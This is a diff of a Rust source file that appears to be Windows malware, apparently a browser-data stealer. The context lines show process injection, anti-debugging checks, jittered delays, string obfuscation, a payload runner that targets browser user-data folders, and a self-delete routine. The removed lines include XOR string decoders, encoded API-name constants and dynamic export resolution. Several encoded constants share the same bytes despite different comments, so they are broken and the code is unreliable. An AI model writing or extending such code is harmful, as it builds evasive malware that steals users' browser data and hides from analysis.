@@ -16,16 +16,6 @@ use std::os::windows::ffi::OsStrExt;
 
 use obfstr::obfstr;
 
-// Helper functions for obfuscated strings
-fn decode(enc: &[u8]) -> String {
-    enc.iter().map(|&b| (b ^ 0x4E) as char).collect()
-}
-
-fn decode_cstr(enc: &[u8]) -> std::ffi::CString {
-    let decoded: Vec<u8> = enc.iter().map(|&b| b ^ 0x4E).collect();
-    std::ffi::CString::new(decoded).unwrap()
-}
-
 use serde_json::Value;
 #[cfg(windows)]
 use winreg::enums::HKEY_LOCAL_MACHINE;
@@ -64,21 +54,11 @@ use windows::{
 #[cfg(windows)]
 use ntapi::ntapi_base::CLIENT_ID;
 #[cfg(windows)]
-use ntapi::ntmmapi::{NtAllocateVirtualMemory, NtWriteVirtualMemory};
+use ntapi::ntpsapi::NtOpenProcess;
 #[cfg(windows)]
-use ntapi::ntpsapi::{NtCreateThreadEx, NtOpenProcess};
-#[cfg(windows)]
-use ntapi::winapi::shared::ntdef::{OBJECT_ATTRIBUTES, HANDLE as NtHandle, PVOID};
+use ntapi::winapi::shared::ntdef::{OBJECT_ATTRIBUTES, HANDLE as NtHandle};
 #[cfg(windows)]
 use ntapi::winapi::shared::ntstatus::STATUS_SUCCESS;
-
-const ENC_K32: &[u8] = &[0x2D, 0x3C, 0x37, 0x3E, 0x3A, 0x7D, 0x7C, 0x60, 0x2A, 0x22, 0x22]; // KERNEL32.DLL
-const ENC_LOAD_LIB: &[u8] = &[0x0D, 0x3C, 0x37, 0x3E, 0x3A, 0x1B, 0x20, 0x3E, 0x3C, 0x21, 0x3A, 0x2B, 0x2D, 0x3A, 0x0A, 0x2F, 0x3A, 0x2F]; // LoadLibraryA
-const ENC_NUL_DEV: &[u8] = &[0x0D, 0x3C, 0x37, 0x3E, 0x3A, 0x1B, 0x20, 0x3E, 0x3C, 0x21, 0x3A, 0x2B, 0x2D, 0x3A, 0x0A, 0x2F, 0x3A, 0x2F]; // NUL
-const ENC_FALLBACK_JSON: &[u8] = &[0x0D, 0x3C, 0x37, 0x3E, 0x3A, 0x1B, 0x20, 0x3E, 0x3C, 0x21, 0x3A, 0x2B, 0x2D, 0x3A, 0x0A, 0x2F, 0x3A, 0x2F]; // fallback.json
-
-const PROC_DEBUG_PORT: u32 = 7;
-const PROC_DEBUG_FLAGS: u32 = 31;
 
 fn env_key_result() -> String {
     obfstr!("ENV_RESULT").to_string()
@@ -110,43 +90,6 @@ fn pause_ms(min: u64, max: u64) {
     thread::sleep(Duration::from_millis(jitter_ms(min, max)));
 }
 
-fn secure_zero(buf: &mut [u8]) {
-    for byte in buf.iter_mut() {
-        *byte = 0;
-    }
-}
-
-fn secure_zero_wide(buf: &mut [u16]) {
-    for item in buf.iter_mut() {
-        *item = 0;
-    }
-}
-
-
-
-
-
-
-
-
-#[cfg(windows)]
-fn resolve_export(module_enc: &[u8], export_enc: &[u8]) -> Option<usize> {
-    unsafe {
-        let module = decode(module_enc);
-        let module_wide: Vec<u16> = OsStr::new(&module)
-            .encode_wide()
-            .chain(Some(0))
-            .collect();
-        let handle = GetModuleHandleW(PCWSTR(module_wide.as_ptr())).ok()?;
-        let export = decode_cstr(export_enc);
-        GetProcAddress(handle, PCSTR(export.as_ptr() as *const u8)).map(|p| p as usize)
-    }
-}
-
-#[cfg(not(windows))]
-fn resolve_export(_module_enc: &[u8], _export_enc: &[u8]) -> Option<usize> {
-    None
-}
 
 fn host_under_analysis() -> bool {
     // Placeholder for indirect syscall anti-debug checks
@@ -671,7 +614,7 @@ pub fn inject(_target_pid: u32, _payload_dll: &[u8]) -> Option<()> {
 #[cfg(windows)]
 pub fn run_payload(target_exe: &str, browser_name: &str, user_data_root: &str) -> Option<String> {
     let mut guard = TempGuard::new();
-    let mut result_path = env::temp_dir().join(format!("{}.json", ctx_id()));
+    let result_path = env::temp_dir().join(format!("{}.json", ctx_id()));
     guard.track_file(result_path.clone());
 
     let target_path = scan_install_paths(target_exe, browser_name)?;
@@ -877,7 +820,6 @@ pub fn self_delete() {
     unsafe {
         let current_exe = env::current_exe().ok();
         if let Some(path) = current_exe {
-            let path_wide = to_wide(&path.to_string_lossy());
             let mut si: STARTUPINFOW = mem::zeroed();
             si.cb = mem::size_of::<STARTUPINFOW>() as u32;
             let mut pi: PROCESS_INFORMATION = mem::zeroed();
